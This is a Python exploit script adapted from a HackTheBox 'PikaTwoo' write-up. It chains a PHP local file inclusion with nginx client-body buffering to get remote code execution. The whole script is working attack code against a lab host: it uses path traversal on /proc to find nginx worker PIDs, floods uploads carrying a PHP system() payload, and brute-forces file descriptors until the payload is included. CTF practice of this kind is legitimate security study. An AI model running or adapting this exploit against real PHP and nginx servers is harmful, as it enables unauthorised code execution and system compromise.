#!/usr/bin/env python3

##
## c/o
## https://0xdf.gitlab.io/2023/09/09/htb-pikatwoo.html
## https://bierbaumer.net/security/php-lfi-with-nginx-assistance/
##
##

import os,sys,re 
import threading,requests

# exploit PHP local file inclusion (LFI) via nginx's client body buffering assistance
# see https://bierbaumer.net/security/php-lfi-with-nginx-assistance/ for details

URL = f'http://pokatdex-api-v1.pokatmon-app.htb/admin/content/assets/add/a'

# # find nginx worker processes 
# r  = requests.get(URL, params={
#     'file': '/proc/cpuinfo'
# })
# cpus = r.text.count('processor')
cpus = 2

# r  = requests.get(URL, params={
#     'file': '/proc/sys/kernel/pid_max'
# })
# pid_max = int(r.text)
# print(f'[*] cpus: {cpus}; pid_max: {pid_max}')
pid_max = 4194304

nginx_workers = []
for pid in range(pid_max):
    r  = requests.post(URL, 
            data={'region': f'../../proc/{pid}/cmdline'},
            cookies={"SESSa": "a"}
        )

    if b'nginx: worker process' in r.content:
        print(f'[*] nginx worker found: {pid}')

        nginx_workers.append(pid)
        if len(nginx_workers) >= cpus:
            break

done = False

# upload a big client body to force nginx to create a /var/lib/nginx/body/$X
def uploader():
    print('[+] starting uploader')
    while not done:
        requests.post(URL, data='0xdf0xdf\n<?php system("id"); /*' + 16*1024*'A')

for _ in range(16):
    t = threading.Thread(target=uploader)
    t.start()

# brute force nginx's fds to include body files via procfs
# use ../../ to bypass include's readlink / stat problems with resolving fds to `/var/lib/nginx/body/0000001150 (deleted)`
def bruter(pid):
    global done

    while not done:
        print(f'[+] brute loop restarted: {pid}')
        for fd in range(4, 32):
            f = f'../../proc/self/fd/{pid}/../../../{pid}/fd/{fd}'
            r  = requests.post(URL, data={'region': f}, cookies={"SESSa": "a"})
            if r.text and "0xdf0xdf" in r.text:
                print(f'[!] {f}: {r.text}')
                done = True
                exit()

for pid in nginx_workers:
    a = threading.Thread(target=bruter, args=(pid, ))
    a.start()


##
##
##
